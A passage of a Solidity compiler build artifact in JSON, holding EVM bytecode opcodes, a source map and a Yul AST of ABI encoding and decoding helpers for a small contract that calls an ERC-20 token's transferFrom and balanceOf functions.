EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x131 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x145 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x169 SWAP2 SWAP1 PUSH2 0x340 JUMP JUMPDEST POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ADDRESS DUP5 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1E9 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x3DA JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x203 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x217 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x23B SWAP2 SWAP1 PUSH2 0x340 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2BD SWAP2 SWAP1 PUSH2 0x3BF JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2D5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2E9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x30D SWAP2 SWAP1 PUSH2 0x369 JUMP JUMPDEST SWAP1 POP DUP1 SWAP2 POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x325 DUP2 PUSH2 0x4DC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x33A DUP2 PUSH2 0x4F3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x352 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x360 DUP5 DUP3 DUP6 ADD PUSH2 0x316 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x37B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x389 DUP5 DUP3 DUP6 ADD PUSH2 0x32B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x39B DUP2 PUSH2 0x470 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x3AA DUP2 PUSH2 0x4B8 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x3B9 DUP2 PUSH2 0x4AE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3D4 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x392 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x3EF PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x392 JUMP JUMPDEST PUSH2 0x3FC PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x392 JUMP JUMPDEST PUSH2 0x409 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x3B0 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x426 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x392 JUMP JUMPDEST PUSH2 0x433 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x3B0 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x44F PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3A1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x46A PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3B0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x47B DUP3 PUSH2 0x48E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4C3 DUP3 PUSH2 0x4CA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4D5 DUP3 PUSH2 0x48E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4E5 DUP2 PUSH2 0x482 JUMP JUMPDEST DUP2 EQ PUSH2 0x4F0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x4FC DUP2 PUSH2 0x4AE JUMP JUMPDEST DUP2 EQ PUSH2 0x507 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH27 0x32175784B7F2AADD0F0D263EF2C80870A1533CB03323E173AEFA95 PUSH6 0x9D981F64736F PUSH13 0x63430008000033000000000000 ",
							"sourceMap": "116:563:1:-:0;;;187:42;168:61;;;;;;;;;;;;;;;;;;;;236:79;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;298:8;277:11;;:30;;;;;;;;;;;;;;;;;;236:79;116:563;;7:143:2;;95:6;89:13;80:22;;111:33;138:5;111:33;:::i;:::-;70:80;;;;:::o;156:284::-;;275:2;263:9;254:7;250:23;246:32;243:2;;;291:1;288;281:12;243:2;334:1;359:64;415:7;406:6;395:9;391:22;359:64;:::i;:::-;349:74;;305:128;233:207;;;;:::o;446:96::-;;512:24;530:5;512:24;:::i;:::-;501:35;;491:51;;;:::o;548:126::-;;625:42;618:5;614:54;603:65;;593:81;;;:::o;680:122::-;753:24;771:5;753:24;:::i;:::-;746:5;743:35;733:2;;792:1;789;782:12;733:2;723:79;:::o;116:563:1:-;;;;;;;"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:3730:2",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "67:77:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "77:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "92:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "86:5:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "86:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "77:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "132:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "108:23:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "108:30:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "108:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "45:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "53:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "61:5:2",
														"type": ""
													}
												],
												"src": "7:137:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "213:80:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "223:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "238:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "232:5:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "232:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "223:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "281:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "254:26:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "254:33:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "254:33:2"
														}
													]
												},
												"name": "abi_decode_t_uint256_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "191:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "199:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "207:5:2",
														"type": ""
													}
												],
												"src": "150:143:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "373:204:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "419:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "428:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "431:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "421:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "421:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "421:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "394:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "403:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "390:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "390:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "415:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "386:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "386:32:2"
															},
															"nodeType": "YulIf",
															"src": "383:2:2"
														},
														{
															"nodeType": "YulBlock",
															"src": "445:125:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "460:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "474:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "464:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "489:71:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "532:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "543:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "528:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "528:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "552:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "499:28:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "499:61:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "489:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "343:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "354:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "366:6:2",
														"type": ""
													}
												],
												"src": "299:278:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "660:207:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "706:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "715:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "718:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "708:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "708:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "708:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "681:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "690:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "677:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "677:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "702:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "673:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "673:32:2"
															},
															"nodeType": "YulIf",
															"src": "670:2:2"
														},
														{
															"nodeType": "YulBlock",
															"src": "732:128:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "747:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "761:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "751:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "776:74:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "822:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "833:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "818:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "818:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "842:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_uint256_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "786:31:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "786:64:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "776:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_uint256_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "630:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "641:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "653:6:2",
														"type": ""
													}
												],
												"src": "583:284:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "938:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "955:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "978:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "960:17:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "960:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "948:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "948:37:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "948:37:2"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "926:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "933:3:2",
														"type": ""
													}
												],
												"src": "873:118:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1075:79:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1092:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1141:5:2"
																			}
																		],
																		"functionName": {
																			"name": "convert_t_contract$_IERC20_$77_to_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "1097:43:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1097:50:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1085:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1085:63:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1085:63:2"
														}
													]
												},
												"name": "abi_encode_t_contract$_IERC20_$77_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1063:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1070:3:2",
														"type": ""
													}
												],
												"src": "997:157:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1225:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1242:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1265:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "1247:17:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1247:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1235:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1235:37:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1235:37:2"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1213:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1220:3:2",
														"type": ""
													}
												],
												"src": "1160:118:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1382:124:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1392:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1404:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1415:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1400:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1400:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1392:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1472:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1485:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1496:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1481:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1481:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1428:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1428:71:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1428:71:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1354:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1366:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1377:4:2",
														"type": ""
													}
												],
												"src": "1284:222:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1666:288:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1676:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1688:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1699:2:2",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1684:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1684:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1676:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1756:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1769:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1780:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1765:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1765:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1712:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1712:71:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1712:71:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value1",
																		"nodeType": "YulIdentifier",
																		"src": "1837:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1850:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1861:2:2",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1846:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1846:18:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1793:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1793:72:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1793:72:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value2",
																		"nodeType": "YulIdentifier",
																		"src": "1919:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1932:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1943:2:2",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1928:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1928:18:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1875:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1875:72:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1875:72:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1622:9:2",
														"type": ""
													},
													{
														"name": "value2",
														"nodeType": "YulTypedName",
														"src": "1634:6:2",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "1642:6:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1650:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1661:4:2",
														"type": ""
													}
												],
												"src": "1512:442:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2086:206:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2096:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2108:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2119:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2104:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2104:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "2096:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "2176:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2189:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
